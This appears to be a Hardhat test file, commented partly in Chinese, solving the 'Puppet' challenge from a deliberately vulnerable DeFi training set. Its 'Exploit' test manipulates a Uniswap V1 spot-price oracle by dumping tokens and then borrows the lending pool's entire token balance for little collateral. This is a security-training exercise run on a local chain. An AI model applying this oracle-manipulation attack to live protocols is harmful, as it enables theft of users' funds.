const exchangeJson = require('../../build-uniswap-v1/UniswapV1Exchange.json')
const factoryJson = require('../../build-uniswap-v1/UniswapV1Factory.json')

const { ethers } = require('hardhat')
const { expect } = require('chai')

// Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
function calculateTokenToEthInputPrice (tokensSold, tokensInReserve, etherInReserve) {
  return tokensSold.mul(ethers.BigNumber.from('997')).mul(etherInReserve).div(
    (tokensInReserve.mul(ethers.BigNumber.from('1000')).add(tokensSold.mul(ethers.BigNumber.from('997'))))
  )
}

describe('[Challenge] Puppet', function () {
  let deployer, attacker

  // Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
  const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('10')
  const UNISWAP_INITIAL_ETH_RESERVE = ethers.utils.parseEther('10')

  const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000')
  const ATTACKER_INITIAL_ETH_BALANCE = ethers.utils.parseEther('25')
  const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('100000')

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners()

    const UniswapExchangeFactory = new ethers.ContractFactory(exchangeJson.abi, exchangeJson.evm.bytecode, deployer)
    const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.evm.bytecode, deployer)

    const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer)
    const PuppetPoolFactory = await ethers.getContractFactory('PuppetPool', deployer)

    await ethers.provider.send('hardhat_setBalance', [
      attacker.address,
      '0x15af1d78b58c40000' // 25 ETH
    ])
    expect(
      await ethers.provider.getBalance(attacker.address)
    ).to.equal(ATTACKER_INITIAL_ETH_BALANCE)

    // Deploy token to be traded in Uniswap
    this.token = await DamnValuableTokenFactory.deploy()

    // Deploy a exchange that will be used as the factory template
    this.exchangeTemplate = await UniswapExchangeFactory.deploy()

    // Deploy factory, initializing it with the address of the template exchange
    this.uniswapFactory = await UniswapFactoryFactory.deploy()
    await this.uniswapFactory.initializeFactory(this.exchangeTemplate.address)

    // 创建 uniswap 配对合约 ETH-DVT
    const tx = await this.uniswapFactory.createExchange(this.token.address, { gasLimit: 1e6 })
    const { events } = await tx.wait()
    this.uniswapExchange = await UniswapExchangeFactory.attach(events[0].args.exchange)

    // 部署借贷池合约
    this.lendingPool = await PuppetPoolFactory.deploy(
      this.token.address,
      this.uniswapExchange.address
    )

    // 授权配对合约可以操纵的token数量
    await this.token.approve(
      this.uniswapExchange.address,
      UNISWAP_INITIAL_TOKEN_RESERVE
    )
    // 添加流动性
    await this.uniswapExchange.addLiquidity(
      0, // min_liquidity
      UNISWAP_INITIAL_TOKEN_RESERVE,
      (await ethers.provider.getBlock('latest')).timestamp * 2, // deadline
      { value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 }
    )

    // Ensure Uniswap exchange is working as expected
    expect(
      await this.uniswapExchange.getTokenToEthInputPrice(
        ethers.utils.parseEther('1'),
        { gasLimit: 1e6 }
      )
    ).to.be.eq(
      calculateTokenToEthInputPrice(
        ethers.utils.parseEther('1'),
        UNISWAP_INITIAL_TOKEN_RESERVE,
        UNISWAP_INITIAL_ETH_RESERVE
      )
    )

    // Setup initial token balances of pool and attacker account
    await this.token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE)
    await this.token.transfer(this.lendingPool.address, POOL_INITIAL_TOKEN_BALANCE)

    // Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
    expect(
      await this.lendingPool.calculateDepositRequired(ethers.utils.parseEther('1'))
    ).to.be.eq(ethers.utils.parseEther('2'))

    expect(
      await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
    ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE.mul('2'))
  })

  it('Exploit', async function () {
    const attackerCallLendingPool = this.lendingPool.connect(attacker)
    const attackerCallToken = this.token.connect(attacker)
    const attackerCallUniswap = this.uniswapExchange.connect(attacker)
    const printBalance = async (groupName) => {
      console.group(groupName)
      const attackerETHBalance = await ethers.provider.getBalance(attacker.address)
      const attackerTokenBalance = await this.token.balanceOf(attacker.address)

      console.log('Attacker ETH: ', ethers.utils.formatEther(attackerETHBalance))
      console.log('Attacker DVT: ', ethers.utils.formatEther(attackerTokenBalance))

      const uniswapETHBalance = await ethers.provider.getBalance(this.uniswapExchange.address)
      const uniswapTokenBalance = await this.token.balanceOf(this.uniswapExchange.address)

      console.log('Uniswap ETH: ', ethers.utils.formatEther(uniswapETHBalance))
      console.log('Uniswap DVT: ', ethers.utils.formatEther(uniswapTokenBalance))

      const lendingPoolTokenBalance = await this.token.balanceOf(this.lendingPool.address)
      console.log('LendingPool DVT: ', ethers.utils.formatEther(lendingPoolTokenBalance))
      console.groupEnd()
    }

    // 授权 uniswap 支配 attacker 的 DVT token
    await attackerCallToken.approve(attackerCallUniswap.address, ATTACKER_INITIAL_TOKEN_BALANCE)

    // 在 uniswap 中使用 DVT 兑换 ETH
    await attackerCallUniswap.tokenToEthSwapInput(
      ATTACKER_INITIAL_TOKEN_BALANCE,
      ethers.utils.parseEther('1'),
      (await ethers.provider.getBlock('latest')).timestamp * 2
    )

    // 计算需要抵押的 ETH 数量
    const collateralCount = await attackerCallLendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
    // 借出 DVT
    await attackerCallLendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE, {
      value: collateralCount
    })

    // 计算兑换 ATTACKER_INITIAL_TOKEN_BALANCE 数量的 DVT 需要多少 ETH
    const payEthCount = await attackerCallUniswap.getEthToTokenOutputPrice(ATTACKER_INITIAL_TOKEN_BALANCE, {
      gasLimit: 1e6
    })
    // 兑换 DVT
    await attackerCallUniswap.ethToTokenSwapOutput(
      ATTACKER_INITIAL_TOKEN_BALANCE,
      (await ethers.provider.getBlock('latest')).timestamp * 2,
      {
        value: payEthCount,
        gasLimit: 1e6
      }
    )
    printBalance()
  })

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Attacker has taken all tokens from the pool
    expect(
      await this.token.balanceOf(this.lendingPool.address)
    ).to.be.eq('0')
    expect(
      await this.token.balanceOf(attacker.address)
    ).to.be.gt(POOL_INITIAL_TOKEN_BALANCE)
  })
})
